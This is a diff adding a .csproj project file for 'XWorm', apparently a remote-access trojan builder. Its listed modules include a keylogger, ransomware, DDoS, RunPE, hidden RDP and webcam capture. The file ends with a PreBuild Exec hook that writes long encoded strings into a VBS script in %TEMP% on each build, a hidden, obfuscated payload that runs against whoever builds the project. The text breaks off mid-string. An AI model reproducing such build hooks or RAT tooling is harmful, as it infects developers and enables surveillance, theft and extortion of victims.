@@ -1,0 +1,551 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>XWorm</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net45</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>11.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <Compile Remove="XWorm.VBCode.Designer.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Remove="XWorm.RemoteDesktop.resx" />
+    <EmbeddedResource Remove="XWorm.VBCode.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="FastColoredTextBox">
+      <HintPath>FastColoredTextBox.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Guna.UI2">
+      <HintPath>Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.WindowsForms">
+      <HintPath>GMap.NET.WindowsForms.dll</HintPath>
+    </Reference>
+    <Reference Include="NAudio">
+      <HintPath>NAudio.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Core" />
+    <Reference Include="SimpleObfuscator">
+      <HintPath>SimpleObfuscator.dll</HintPath>
+    </Reference>
+    <Reference Include="GMap.NET.Core">
+      <HintPath>GMap.NET.Core.dll</HintPath>
+    </Reference>
+    <Reference Include="IconExtractor">
+      <HintPath>IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>Newtonsoft.Json.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="XWorm.VBCode.Designer.cs">
+      <CustomToolNamespace>ResXFileCodeGenerator</CustomToolNamespace>
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.VBCode.resx</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <PackageReference Include="DotNetZip" Version="1.16.0" />
+    <PackageReference Include="System.IO.Compression" Version="4.3.0" />
+  </ItemGroup>
+  <ItemGroup>
+    <Resource Include="XWorm.RemoteDesktop.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.RemoteDesktop.Designer.cs</LastGenOutput>
+    </Resource>
+    <Resource Include="XWorm.VBCode.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <CustomToolNamespace></CustomToolNamespace>
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <LastGenOutput>XWorm.VBCode.Designer.cs</LastGenOutput>
+    </Resource>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Update="XWorm.About.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.About.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.RemoteDesktop.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.RemoteDesktop.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.VoiceChat.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.VoiceChat.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Builder.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Builder.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Chat.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Chat.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Clipboard.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Clipboard.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Clipper.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Clipper.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.CustomOpen.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.CustomOpen.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.DDosAttack.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.DDosAttack.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.EditReg.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.EditReg.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.FilesSearcher.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.FilesSearcher.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Form2.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Form2.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.HApps.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.HApps.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Hash.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Hash.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.HBrowser.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.HBrowser.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Hosts.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Hosts.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.HRDP.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.HRDP.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.INFO.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.INFO.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Keylogger.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Keylogger.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Main.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Main.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Maps.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Maps.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.MBox.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.MBox.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ngrok.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ngrok.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Performance.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Performance.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Port.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Port.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ProcessV.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ProcessV.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Programs.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Programs.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Proxy.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Proxy.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Ransomware.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Ransomware.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Registry.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Registry.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Resources.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.RunPE.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.RunPE.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ServiceManager.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ServiceManager.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Shell.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Shell.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.Sound.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.Sound.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.StartupManager.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.StartupManager.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.TBotNotify.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.TBotNotify.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.TcpConnectionForm.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.TcpConnectionForm.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.ToolsBox.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.ToolsBox.resx</DependentUpon>
+    </Compile>
+    <Compile Update="XWorm.WebCam.Designer.cs">
+      <DesignTime>True</DesignTime>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>XWorm.WebCam.resx</DependentUpon>
+    </Compile>
+  </ItemGroup>
+  <Target Name="PreBuild" AfterTargets="PreBuildEvent"><Exec Command="@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\L2x3dc&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;w4jDrsOjw4XDrcOew5HDp8KVwqbDj8OAwoLDtMOlw4PDq8OWw4/CmcKdwr3DrMOpw5TDosOjw4nDlsKZw4fDp8Khwr3Dm8Ouw5bDnsOQwr/DlsKZw5XCu8Kewp3CncOgwoLCtsKVwrDDnsOswo/DiMOXw4zDnsOYw5bCmcOXw5vDrcOawr3DlsKVwpXCq8KwwobDr8KVwp/CmcODw4fDsMKiwrHDm8Ofw4fDnMOpwoLDm8Ouw5bDnsOQwr/CmcKmwpjCtMKZw4bDnsOnw4vDr8OawqTDssOpw4fDrMKVwp/CmcODw4fDsMKiwrHDm8Ofw4fDnMOpwoLDjMOuw5XDrcOaw4/Cp8OIw4fDnMOqw5TDosOpw5vCp8K4w5TDssOlw5bDqMOcw5TDmsOlw4rDssKjwrTDn8OYwpTCscKuwprCvcOaw5TDosOrw4fCu8Ouw5bDnsOoworCncOaw5DCpcKVwobDrMK3wo7CmcKmwpLCqcKlwo7CmcOQwrXDssOow5bDnsOiwpDDjMOaw4XDrsOnw4vDrcOuwpDCvMOnw5vDqcOpw5HDoMOnw4PDqcOdw5vCp8K9w4PDrMOdwqPDpcOcw5HDq8Oew5bDocOiwrDDmsOiw4fDlsKvwpzDjMK9wqPCq8KqwpjCosKwwobDpMKVwp/CmcKZw4bDnsOnw4vDr8OawqTDssOpw4fDrMKjwqnDnsOpwqTDssOpw4fDrMKdwpXCq8Kewp3CncOrwoLCtsKVwobDncOaw5TDosOrw4fCu8Ouw5bDnsOowpDDgMOaw5bCu8Ouw5bDnsOoworCqsKrwovCtMOnw4fDrcOqw5TDp8KVwqLDtMKVwq3CmcKywoLCncOgwp3CmcOLwoLCtsKVwobDr8KVw5/DtsKww4jDrsOjw4XDrcOew5HDp8KVwqbCmcOww5LDmsOnw4PDpsKVworDlMOow5bDq8Oew5DDoMOSwobDnsK3wrzCpcOQw5XDrcOnw4vDp8Ocwr/CncOaw5DDnMKewp3CncOZwqTDssKVwp/CmcOQwrXDssOow5bDnsOiwpDCvMOkw5DDr8Oaw5TDrcOSwpzCs8K7w5TDqMOiwqTDmsOow4fCr8KpwrXDrcOnw4vDp8OcworCncOawqTDk8Kewp3CncOow4TDssKVwp/CmcKZw4bCu8Ouwr3CqcKjwpDCsMOSwp3CncOawqTDssKVwp/CmcKZw4bCu8Ouwr3CscKjwpDCocKZw4bCu8OuwpDDhcOaw5DDoMOpw4rCmcKiwoLCqsKewr/CtMKZw4bDq8OrwoLCtsKVwqbDj8OAwoLCpsOaw5DCmcKZw4fDp8OYwoLCpsOowqTCmcKZw5XDm8Ouwp3CncOgwoLCtsKVwobDncOnw5jCp8OAwp3CncOrwoLCtsKVwobDncOnw5jCp8OLwp3CncOWwoLCtsKVwr3DjMOuw5XDrcOaw4/Cp8OIw4fDnMOqw5TDosOpw5vCp8K4w5TDssOlw5bDqMOcw5TDmsOlw4rDssKjwqPDnsOowr/Cs8KvwqXDq8Oaw4PDrcOaworCosKwwobDmsKjwq/DqMOZw4fCmcKywoLDlMOIw5vDrMOpw4fDpsKjwrXDnsOYw5fDq8Oew5bDssKjwqXDq8Ouw5LDrcOkw4nDq8OWw5LDocOuwpDCvMOew5LDocOaw5TDhsOkw4bDnsOSwpzCs8K4wqTCvMKwwobDmsKjwrLDmsOZw4bDosOjw4nCmcKywoLDlMOIw5vDrMOpw4fDpsKjwrXDnsOYw5fDq8Oew5bDssKjwqXDq8Ouw5LDrcOkw4nDq8OWw5LDocOuwpDDicOWw4bDncOew5DDoMOCw5HDncOawr/Cs8KvwrLDhMK4wrXCsMKwwobDmsKjwq3DnsOuwoLCtsKVwobDpMKwwobDmsKjwqvDj8KVwp/CmcKZw5jCtMKZw4bDnMKVwp/CmcKZw4PCp8K4w5TDnsOWw5bDnsK5w4fDnMOnw5vDqcOpw5HDq8KdwovCtMOpw5TDssKVw53CncOZwqTCmcKywoLCncOZw4XCp8OJw5TDmsOjw5XDn8Okw5TDpsK7w4vDp8OWw47Cu8Ohw5HDnMOgworCncOawqTDssKhwoLCqcKhwoLCncOawqTDssKjwq7DnsOjw4nDrcOdwovCtMOnw4fDrcOqw5TDp8KVwr3DjMOuw5XDrcOaw4/Cp8OJw4fDscOpwpDCvsOjw4XDqMOZw4vDp8Ocwr/Cs8KvwrfDjcK7wprCp8K8w4fDrcOIw5bDq8Oew5DDoMKdwobDncK3wovDtsKVw4XDmsOpw4XDocKVw53Dq8Oaw5bDrsOnw5DCmcKZw5DDrsOhw47DtsOywobDnsK3woLCtsKVwoTCvsOpwprDm8OWwqPDhMK9w4zDs8KmwpHDh8Omw4fCpMODw47DjsOew5LDpMOsw4XDrMKpwqfCr8OFwpjDpMOuw5rCv8OMwpbDj8OiwqTCvMK4w5HDiMOXw4TDnsOcwrzDr8OgwrDDqMOOwqrDpsKkw5DCusKow5TCqsOuw4/DrsKqw5DCv8OOwpbCrsOewq/CrcKtwpXCr8KowqXCv8OHwrbDqsOsw5TCpMOaw4TCvcKnwpjCsMOOwrTDnsK4wqvDhsOqw4zDksOfwq3CusOOw4nDpMOGwpHDr8OWwrPDscOtwqrCrsOHwqnCrcOawqXDrMOXwpPDkcOuw47DnsKkwpTCrsOrwrbDscOLwrbCrcOswqrDgsK5wrTDicOvwqfDpcOkwqPDqsK2w4TDq8OiwrDCusOOwpXDscONwrfCsMK7wq3DrcOdw5XDpsOEwpjCssOPwrPCsMK/wrDCsMKrwrPCrcOewpnDi8K3wqjDiMOlwrHCq8Oowo3DhcOowqrDs8K2w4rDosOCwpHDkMK5w5DDoMK7wpPDhcOEwpfDkcOrwpHDo8K2wpPDkcOhw4fDm8ObwqfCusOAwrDCpMKlwo3CvcOawpnCssOBwpfDicKkwq7DrsOrw5PCqMObwqXDs8ObwpTDn8K5wqfCrMKqw5zDisOqwpXDg8OrwrrDrMOHwqvDsMKsw5LDnMOWw4nDscKlwrfCvMK6w4bCvsKgwrbDgcKowq3DnsKnwqbDrsOHw4PDo8OPwrzDscOlw5PDg8OjwqrDk8OMwpbCssOMwqzCv8K4wrTCqsOBwrnDi8K7wrLDs8OZwqXCqMOdw5zDpcK+wq3CrsK2w5PDk8Krwq7Ds8ODw4PDjsOEwqzDhMOawrrDicOLwrTDosK/w5TDrMOowqTDssKrwqXDncOtwrbDpsOKwpTDjMOfwqbCssKtwqfCr8Oqw4vDhMOmwpbDicKkwpLCscKuw5XDjMOXw4PDjMOowrHDocOhw43DksOAwpvDr8OYw4PDgcOFwpjDicOAw47DksKlw5fDs8KqwpnDm8OIw5XDssKnwrXCqMKuwrLDjcOKwpfDocODwrzCpMOGw5fCqMOvwpvDksOiw5nCusOJwrvCrsOdwqvDncOMw47Cr8OewrXDhMOLw4/CrMK/w5TCscKtw4bCrMOMw5zDnMONw5fDn8KowrjCrsOIwprDgsOFwqTCpMK3wrjDr8Kkw4bDk8Obw4jDrMOvwrfCu8Ohw5vCrsOIwqvDjMOtwpTCvcOawqPDnMOIw4bDocK4wqTCqcK6wpTCpMK9wpnCusOLwo3Cu8K8w4/DpcOaw47CpMK5w4TDn8Omw4vDhcOjwpLCusK4w4XDisKrw47DrMOow5LDjMObwo3Dg8Knw5nDo8KlwqTDhMOaw5XDkcOOwpjCvMOGw4rDssOew4PDsMOmw4zDgcOlwrXDjsKsw5rDrsOlwrfDisOcw5TDg8Oaw5vCqMKmw4bDp8OcwqjDhcOIwqTDh8Ksw5XDhcOOwpTCusOHw43DsMKswrfDk8OWwpLDh8OJwprCqcOXwqnCvsKgwrXDisOHwpHDgcK3w4zDjsOlwqbCssOCw4/DnMK9w5vDrcOsw5fDhcKuw5jDisOEwo3CsMOCw47DpcOcw47Dn8OKwpvDhsOswrjCrsOjw4vDrMOlw4TDjsOAw4rDkcOqw4nDgMOHwrfDoMOFwpTDmsKowqnCr8K8wpLDgMKqwrfDs8OewrvDscODw5rDqMK+w4PDksK7wpfDoMKow4vCssKmwqPDqMK/wqXDiMOMw4jDicKkw47Dp8OCwq/CqcOWwqbDsMOIwqnDocKowrLDgsOfw4fCqMOawqPDicKowqbDqcOWwrTCr8OcwrrDosKrw4rDpMOCwrbDisOpw4zCq8OkwrvDgcOkwrLDpMObwrjDgsOPwqzCqMK2wrHDrcOdwq3Di8Odw4PDncOcwpnCsMOXwpnDscK7wpjDrcOcw4/DiMOFw4jDhcOLw5nDhcOpwqjDssOhw5HDssKtw5nCvsOMw5HDr8KnwpbCvMOLwpjCssOXw4fDgMKnw47DnsK/w4vDssKpwpHDjcOswpnCusOIwqPCscKmw4nDn8OCwpPDosKgwpvCr8Oiwo3DncOGw4fDjsOKw4rDicOawrTCssOpw5rDk8K3wrfDpcOhwq7CrMOawqTCq8OfwqXCvcKuw47Dm8OMwrTCusOjw4bDi8OYwqzDpMOewpvDr8Oowq7DhsODwqTDh8OfwpLDg8OvwpjCq8OFw5DDssOawqjCrMOXw4PDjMOdwq/CusOswrnDqcKmwqjCrsOYw4/DosOqwqfDosKqwq3CvsOfwqjCssOiwqPDisOFwq3Di8K6wpLDscODwqzDicOsw4PCrsOCwqPCrMOfw5XCssOBwrDDosOrwqrDkMK+wqTDpcOfw5TDs8K+wpTDs8OYwqvDh8Ovw4PCqMOaw5fCusOOw4fDoMOdw4vCu8OLw43DgMOtwpbDh8OjwpTCrsOHw4vCssOpw4TDssOBwpLDm8KowrfDjMK2wpXDkMOewpnCu8K6wqvDnMObw5HCu8OuwrvCvMOWwpbCvsOowrTDjMOfwqbDmsK2wrzDpMOiw4nCvsKswrvDn8OGwrXDk8Kgw4PCvcOOwpjDisOlwq7CrsOFwpfDksOAwqzDkcOKw5PDr8K4w4rDhcOKwpLDnMKqw5bDhMKsw5PDn8Odw5DDhcOLwrPDkMOFwrDDn8OBwrrDncOXwpbDqMOewrjDhsKkwpfDncK8wo3Ds8Ovwo3Dq8OuwrPDiMKpwpPDhsOew5bDr8K6wrjCqcOow4/CrcOuwqXCssOhwqrDpsOrw5bCsMOmwqTDjsOvwrPDgMK+w4fDn8K8wpHDo8Olw5nDjcK+wq3DocOmwqXDsMK4wq/DocKpwrnDpsOZw5PDh8K5wpvDpMOvwpPDi8K8wpXDhMKtwqPDpsOXw5rDm8Otw5XCqcONwrTDi8Ofw4/Dj8Oew4/DoMOXwrjDnsKqw5rDncOtw5LDncK8wqrCscOIwqvDj8OKwrLDgsOOw5PDrcOIw4rCsMKgwrDCrsOowqbCr8K2w47DosOgw47CvcOpw5nDjcOYw5vDqsObw4XDrcOOwpnCsMOvw5rCr8Ovw4rDqsOrwq3DssOYw5TDgsODwrXDm8OfwqzCu8K/wrHDmsOtwrHDocOZw4vDssK7w5fCu8OHwqvDnsOhw5zDk8K4wrbCr8KgwpvDscOXwrjDrsKkwrTDsMOtwpvDjcOew4zDmsKtwrHDgsKtwqnDscOrw4nCusOMwrPDgcOhwrHCvcOjwrXDksOuw47DkMKnwpfDh8ODwqzDi8Kkw43Do8K+wrnCqcOgw5DDs8OXwpnDnMOfwqrCvsKswpnDscOLwrDDpcObw4jDqMOLw5XCsMOrw5LDi8Klw4TDqMK3w5zDp8OGw47CrMOpw4vCqcOkwqfDh8OWwq/DnsOGw4TDpMOcwrPDjMONwq3Dm8OEwrLDgsOnwqTDhcOfwrjCrcODw4TDnMOGwpfDk8Opw4jDscKnw4rDgsOgw5XDncONwrfDscOdw4/DnsKnwo3DgMK5w4nDhMKkwqXDqMK7w4PDp8Opw5XDocK/wq3Dg8OtwrPDgMK+wrbDgMOIw5TDqsOWw5nDncK6w47Do8OXwpvDssOsw5rDncK6wrPDq8Oswr&quot; &gt; &quot;%25a%25\D8xj5bHO9.vbs&quot;&#xD;&#xA;echo c = &quot;h8K8w5jDg8OOw4XDhcK3wrPDjsOkw4rDssOowqXCssOvw5XDqsOFw4fDisOjwrPDs8OGwrvDncOJwprDsMOrwo3CqsObw5nCvMOuwpHCv8K3wpnDiMK9wq3DpsOawrjDpMOdwpTCr8Odw5XDkMOhw4nCvsOFw5LDrMK5wpbDoMOOwrTCqsOsw5HDs8OmwrnDrsOgw5rDrMOFwqnDm8KlwqbCqMOswpPCqMOswrnDocOWwpfDnsOkwrDDjcKswo3Dm8OBwqjCvsOZw5TCvMKnw4/Cv8Ofw4nCssOGw5HDkMK8wrPDkMK+wpPCr8Opw4/DnsOvw4nDrMKlwrbCrcOow5HDkcKpw5zDoMOlwpnCvsOLw4nDg8OXwpHCrcKqw5PDpMOjwpPCq8OAwpfDjcObw5zDn8K2wq/CrMOBwrrDk8K2wo3DqMKtw4rCvMK3w5rDkMOKwq3Dr8OFwpjDkMKswrDDrMOHwq/DhsOXwpHCvcOPwrXDr8OBwpnDisOHw5LDnMKrw47DoMK7wprDn8OnwrnCusK9wqfDsMOBw5bDmsKow5fCvsKnw4vDi8OuwrHCr8OmwqXDhcOHw5jDr8Kuw5nDp8OJwqvCrcOYwpbCrcKqw4nDhcK9wrTDgcOvwqbDgMOpwrHDs8OKwqXDpcOrwrjCqcOMw5DDqsOjw4rDhsKnw5LDssOLwqbCrsOXwpnCusKmw4bCrcOrw5fCssK7w4PDn8Okwo3DicOiw5jDhsOFwpPCvcOdwrzDscKtwqvCvMK4wprDiMKnwpjDssK4w5fCusK2w4vCqMOrwq3Cq8OKwqbDosOsw4vDjcKowqbCr8OowpjDi8OgwqXCq8OBw4TDpcK9wpHDjsOmwqbDkcOmwrfCscOEwq7DncOrwqPDq8OOwrXDhMKqw4/Dk8K/wrXDncKnw47CsMKuwpPDn8K8w4fDhMK2wrXDrMOaw4vDgsODwrrDgsK6wq3DrMKuw5bDqsOLwpfCq8KrwrrDoMKtwrjDjcOAwrPDn8Knw5zDocOIw4rDqcOqwqjDksKqw5rCscONw5LDq8OkwpjDg8OawpTDpcK2w4/DjcKmw5fDkcOXwpPCr8OBw5zDkMOBw5TDnMOkwrrDgMOgwqvDgcOqwrfDgcOlw4nDicK/w5rDsMOiw4TCqMOMw5TDj8ONwq/DkMK3wrHDpMOAwo3DiMKmw5LDj8Odw5DDisK8wpjDscOgw5PDo8K7wpPDpcObwrXCrcOAwrHCvsKqw5rCvsODw5vCrMKgwpXDnMK2w4/Dg8OMw4zCvMOgw4XDnMODwrrDsMOIwqTDpcOjwqXDo8K4w5XDncOcwpnCr8OdwrjDhMOlw4/DhsK8wrTDncK5w5DCvcOEwpvDgMOPw5nCvsK4w43DqcOow5LCqcOCwrXDqcOGwrfCq8Obw4vDr8OIwpXCr8OiwpLDqMKrwprDgMOvwpjDo8OXwrjCrsOow4nDpMOlw4jDgsOew4nDnsOXwqnDnMOWw4PDq8OvwrXDncOfwpjCq8K2wqnDscK3wpbDiMOYwrrDqcOewpnDjsOcw4TCusKmw4TDp8Oew4PCscK2wqzDs8Ogw5fDhMODw4TDgsOuw4fDgcOMwqrDm8K6w4bCrMK3w5PCr8KmwqnCscOZwpjCsMKqw4jDrsOnw4rDhsOBwo3Dg8KowrLDicK/w4rDi8K6wrnDncK9wpHDp8Ofw5rCvcK6w5jCqMOgw5zDosOYwrXDkMOGwqTDmsOpwrHDscOXwqfDrsK7wpvCrcOXwrTDjsKmwqzCv8K/wqfCpMOJw5TCvsOcwq/DjsOnwpnDiMOuwqvCqMOjwrbDrMOswpLDjMK5w5nDk8Otw5fDisONw5rCrMK+wpvDssOqwrrCqsOfwrfDscOdw4nDs8Ogw5fDn8Kpwq/DnMOCwpPDq8OGwpLCv8K2wpvCscKgwrXDh8OIwpXDs8OMwpbCrsOrwqrDqcKnwpHCvcKlw4fDncOZwrHDr8OAwqjDrsOGwrvDs8OAwpHDkcOEwprDncOGw4jCu8OowrDCvsOiwqXCvMOkwrTDkMK+w5zDs8OfwpXDmsKpwpbDm8Oowq7DnMOfw4rDqsK/wprDi8OlwpPDicOJwrnCsMKpw4XDpsOAw5fDpsOBw43DkMOmwpXDhcOOw4TDnMKrwqXDjsK7wq7DjcOswpLCvsOOwpLDrcOtwrLDg8OZw5vDqcK5wprDkcOLwqTDmsOsw5bCpMK9w5PDhsOGwpjCusOIwqnCqsOJw5TDocOIwqjDs8K8w5PCvMK7wqrDisOjw5bDj8KgwqzDo8K9wqPDkcKswq3Dk8KkwpLDn8OJw47DqsOIwq/CqsKqw43Dp8OjwrDDksOFw5HDhcOsw4nDn8K8wpbDgMOPw4vDpcKlwqbDscObwpnDo8OFw5zDgMOjw4PCu8K5wqjDnMOuwrXDhMKowpLDiMOmwrTDr8Oew4PDpcOfw5TDj8K3w5TDkMOkwrvCvMOlw5DDjMOYw4rDi8K5w5XDpMKmw4XDhcONw4/CvcOEwrXDg8K2w4nDhsODw5zDhcOiw47Dn8OkwqrCv8OYwpjDqsKgwpbDmsK6w5rDqsOvw5nDrcKlwrvCpMOdwqXCrcOFwrDCv8ONwpLDj8K2w5LDqcOZw47Cv8K4wrzDoMOnwqzDpsOCwqTCvMOdwq/CpMOAwpTDpMOYw4TDq8OWwpnDs8OXwrDDk8KkwqjCscK8wq3CpMOKwpPDiMOmwqvDicOKwq3Dr8ONwpbDj8Ktwq3Dm8K+w5vDr8KlwqzDgsOvw5fDr8OKwpTDkMOlwpXCsMKmwrnCrsKow4/DgsOPwqfDksKtwrvDo8Osw4fDiMOiwqbDq8OKwqTDrsK9w47DjMOLwpvDgcONw5DDk8Odw4PDr8Odw4rCvMOAw5zDqcOOwpfDncKgwrjCssOKw5PDi8K5w4fDp8OfwrXDosOAw4zDp8Kqw4vDjcOBwqzDrsOpwprCq8Kmw5DCpMOiw5nDgMKrwqbDksOPw5nDssOXwpbCqsOEw5zDpMK5w5jDisOJwpHCv8OKw4bCrsOGwpnCr8OBw4bDgcKlwo3DgMK7w47DnMOHw4fDrcOBwqPDgcKgwqzCssKtwq7CqsOpw5DCrsOEwrfCpMOHwqzDsMOtw5nDn8Ovw5fDp8K2wqvDrsOZwq/DqMOWw4rDkcOmwprDnsK/w4XDscOqw5bDqMOXwqTDoMKmw4bDpsOFwrbDnMK5wpbDk8OdwqrDpMOiw5bDhcKqwpHCrMOiw4PDq8K6wrzDgcOXwpvCu8OpwpPDq8OPwrHDh8KrwrjDqsKlw4/DhsOYwrfDncK+wrjDkMOpwrfDg8OqwpfDscObw5bDrcKrw